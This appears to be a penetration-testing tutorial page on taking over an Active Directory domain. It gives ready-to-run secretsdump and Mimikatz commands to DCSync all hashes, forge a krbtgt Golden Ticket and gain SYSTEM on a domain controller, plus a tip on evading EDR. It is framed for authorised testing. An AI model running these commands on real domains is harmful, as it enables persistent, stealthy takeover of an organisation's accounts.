---
title: DCSync and forge a Golden Ticket
slug: dcsync-and-golden-ticket
area: active-directory
module: 13
order: 4
goal: Pull every domain hash with DCSync, then forge a Golden Ticket from krbtgt for full, persistent domain control.
summary: How to take domain dominance — DCSync the hashes (incl. krbtgt) with secretsdump or Mimikatz, then forge a Golden Ticket to impersonate any user, with the restraint and cleanup notes.
prereqs: [DS-Replication rights (Domain Admin, or granted by an abused ACL), Reach to a Domain Controller, Authorisation — this is high-impact and logged]
seeAlso: [tool:secretsdump, tool:mimikatz, tool:impacket, howto:pass-the-ticket-windows, howto:abuse-ad-acls, map:active-directory]
references:
  - The Hacker Recipes: DCSync | https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync
  - The Hacker Recipes: Golden ticket | https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/golden
---

With replication rights you can ask a DC for every account's hash — including `krbtgt`, the key that signs all Kerberos tickets. The krbtgt hash lets you forge a Golden Ticket: a TGT for any user, any group, valid until krbtgt is rotated twice. This is the top of the domain; it is loud and logged, so only in scope and documented.

## DCSync — pull the hashes

```bash
secretsdump.py 'corp.local/you:pass@DC01' -just-dc-ntlm          # all NT hashes
secretsdump.py 'corp.local/you:pass@DC01' -just-dc-user krbtgt   # just krbtgt
```

```cmd
mimikatz # lsadump::dcsync /user:corp\krbtgt
```

Note the **krbtgt NT hash** and the **domain SID** (`whoami /user` on a domain host, or in the dump).

## Forge the Golden Ticket

```bash
impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain corp.local Administrator
export KRB5CCNAME=Administrator.ccache
nxc smb DC01 --use-kcache                                        # act as Administrator
```

```cmd
mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:HASH /ptt
```

## Use it

```bash
psexec.py -k -no-pass corp.local/Administrator@dc01.corp.local   # SYSTEM on the DC
```

## If it fails

- **DCSync "rpc_s_access_denied"**: your account lacks DS-Replication-Get-Changes(-All) — grant it via an ACL edge first (see Abuse AD ACLs), or use a DA account.
- **Golden ticket rejected**: wrong domain SID or krbtgt hash, or clock skew — re-check the SID and sync time to the DC.
- **Detected / ticket killed**: forging a real existing user with sane lifetimes is quieter than `Administrator` with a 10-year ticket; EDR may flag the classic values.
- **krbtgt rotated**: a Golden Ticket dies after two krbtgt resets — re-DCSync for the current hash.

## Verify

```bash
klist                       # the forged TGT for your chosen user
psexec.py -k -no-pass corp.local/Administrator@dc01.corp.local   # whoami = system
```

This is domain dominance. Record every artefact (tickets, any persistence) for the report and cleanup.
